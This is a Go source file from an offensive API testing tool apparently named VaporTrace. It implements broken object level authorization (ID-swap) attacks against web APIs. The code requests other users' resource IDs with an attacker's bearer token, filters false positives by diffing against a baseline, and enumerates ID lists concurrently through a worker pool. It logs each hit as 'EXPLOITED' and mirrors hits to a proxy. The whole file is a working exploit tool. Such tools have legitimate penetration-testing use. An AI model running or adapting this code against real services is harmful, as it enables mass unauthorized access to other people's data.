package logic

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"path"
	"strings"
	"sync" // Used in MassProbe

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/pterm/pterm"
)

// BOLAContext defines the parameters for an ID-swap attack
type BOLAContext struct {
	BaseURL       string
	VictimID      string
	AttackerID    string
	AttackerToken string
}

// getResource fetches a resource and returns status and body for comparison
func (b *BOLAContext) getResource(resourceID string, token string) (int, string, error) {
	u, err := url.Parse(b.BaseURL)
	if err != nil {
		return 0, "", err
	}
	u.Path = path.Join(u.Path, resourceID)
	target := u.String()

	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
	req.Header.Set("User-Agent", "VaporTrace/2.1.0 (Phase 9.4 Surgical)")

	// GlobalClient is defined in network.go
	resp, err := GlobalClient.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body), nil
}

// Probe handles a single, detailed BOLA analysis with UI feedback (Phase 9.2)
func (b *BOLAContext) Probe() {
	pterm.DefaultHeader.WithFullWidth(false).Println("Surgical BOLA Engine [PHASE 9.2]")

	activeToken := b.AttackerToken
	if activeToken == "" {
		activeToken = CurrentSession.AttackerToken
	}

	if activeToken == "" {
		pterm.Error.Println("No Attacker Token configured. Use 'auth attacker <token>'")
		return
	}

	var baselineBody string
	if b.AttackerID != "" {
		spinner, _ := pterm.DefaultSpinner.Start("Establishing Baseline (Attacker's own data)...")
		_, body, err := b.getResource(b.AttackerID, activeToken)
		if err == nil {
			baselineBody = body
			spinner.Success("Baseline established.")
		} else {
			spinner.Warning("Could not establish baseline. Falling back to status-only mode.")
		}
	}

	spinner, _ := pterm.DefaultSpinner.Start(fmt.Sprintf("Probing Victim ID: %s", b.VictimID))
	code, probeBody, err := b.getResource(b.VictimID, activeToken)

	if err != nil {
		spinner.Fail(fmt.Sprintf("Connection failed: %v", err))
		return
	}

	isVulnerable := false
	analysisMsg := ""

	if code == http.StatusOK {
		lowerBody := strings.ToLower(probeBody)
		isGenericError := strings.Contains(lowerBody, "not found") || strings.Contains(lowerBody, "error") || strings.Contains(lowerBody, "denied")

		if baselineBody != "" && probeBody == baselineBody {
			spinner.Warning("Potential False Positive: Server returned Attacker's own data.")
			analysisMsg = "Reflected self-data"
		} else if isGenericError {
			spinner.Warning("False Positive Filtered: 200 OK received but body indicates error.")
			analysisMsg = "Cloaked Error Message"
		} else {
			isVulnerable = true
			spinner.Success("VERIFIED BOLA VULNERABILITY")
		}
	}

	if isVulnerable {
		pterm.Warning.Prefix = pterm.Prefix{Text: "VULN", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
		pterm.Warning.Println("Unauthorized data extraction confirmed via Response Diffing.")

		pterm.DefaultTable.WithData(pterm.TableData{
			{"METRIC", "VALUE"},
			{"RESOURCE ID", b.VictimID},
			{"LEAK SIZE", fmt.Sprintf("%d bytes", len(probeBody))},
		}).WithBoxed().Render()

		db.LogQueue <- db.Finding{
			Phase:   "PHASE 9.2: SURGICAL BOLA",
			Target:  b.BaseURL + "/" + b.VictimID,
			Details: fmt.Sprintf("Confirmed BOLA on %s (Diff Verified)", b.VictimID),
			Status:  "EXPLOITED",
		}
	} else if code == 403 || code == 401 {
		spinner.Success("Target Secure (403 Forbidden)")
	} else {
		spinner.Stop()
		pterm.Info.Printfln("Result: %s", analysisMsg)
	}
}

// MassProbe handles high-speed concurrent BOLA scanning (Phase 9.3)
func (b *BOLAContext) MassProbe(idList []string, threads int) {
	pterm.DefaultHeader.WithFullWidth(false).Println("BOLA Concurrency Engine [PHASE 9.3]")
	
	idChan := make(chan string, len(idList))
	var wg sync.WaitGroup

	pb, _ := pterm.DefaultProgressbar.WithTotal(len(idList)).WithTitle("Scanning IDs").Start()

	// 1. Spawn Worker Pool
	for w := 1; w <= threads; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for id := range idChan {
				instance := *b // Thread-safe local copy
				instance.VictimID = id
				instance.ProbeSilent() 
				pb.Increment()
			}
		}()
	}

	// 2. Feed IDs
	for _, id := range idList {
		idChan <- id
	}
	close(idChan)

	// 3. Cleanup
	wg.Wait()
	pb.Stop()
	pterm.Success.Println("Mass Scan Complete. Results persisted to database.")
}

// ProbeSilent is the worker-friendly version for high-speed scanning (Phase 9.3 + 9.4)
func (b *BOLAContext) ProbeSilent() {
	activeToken := b.AttackerToken
	if activeToken == "" {
		activeToken = CurrentSession.AttackerToken
	}

	code, body, err := b.getResource(b.VictimID, activeToken)
	if err != nil {
		return
	}

	if code == 200 {
		lowerBody := strings.ToLower(body)
		if strings.Contains(lowerBody, "not found") || strings.Contains(lowerBody, "error") {
			return
		}

		// UI Output for findings
		pterm.Warning.Prefix = pterm.Prefix{Text: "HIT", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
		pterm.Warning.Printfln(" BOLA Confirmed: %s", b.VictimID)

		// PHASE 9.4: Mirror to Proxy (Burp/ZAP) for manual inspection
		go func(targetID string, token string) {
			// Sending a background request through GlobalClient (Proxy-aware)
			b.getResource(targetID, token)
		}(b.VictimID, activeToken)

		// Log to Database
		db.LogQueue <- db.Finding{
			Phase:   "PHASE 9.3: CONCURRENT BOLA",
			Target:  b.BaseURL + "/" + b.VictimID,
			Details: "Confirmed via Multi-threaded Worker Pool",
			Status:  "EXPLOITED",
		}
	}
}